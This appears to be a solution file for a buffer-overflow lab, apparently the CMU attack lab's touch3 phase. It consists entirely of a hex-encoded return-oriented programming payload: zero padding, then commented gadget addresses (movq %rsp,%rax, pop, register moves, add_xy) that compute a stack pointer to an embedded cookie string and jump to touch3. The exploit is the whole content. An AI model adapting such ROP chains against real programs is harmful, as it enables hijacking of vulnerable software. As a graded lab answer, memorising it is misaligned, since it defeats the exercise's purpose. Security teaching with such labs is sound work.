00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
64 22 40 00 00 00 00 00 /* movq %rsp, %rax */
0f 21 40 00 00 00 00 00 /* movq %rax, %rdi */
31 21 40 00 00 00 00 00 /* pop %rax */
48 00 00 00 00 00 00 00 /* offset */
8e 21 40 00 00 00 00 00 /* eax -> ecx */
6f 21 40 00 00 00 00 00 /* ecx -> edx */
19 22 40 00 00 00 00 00 /* edx -> esi */
55 21 40 00 00 00 00 00 /* add_xy */
0f 21 40 00 00 00 00 00 /* movq %rax, %rdi */
44 20 40 00 00 00 00 00 /* touch3 */
32 66 36 63 62 32 64 36
00 /* cookie */





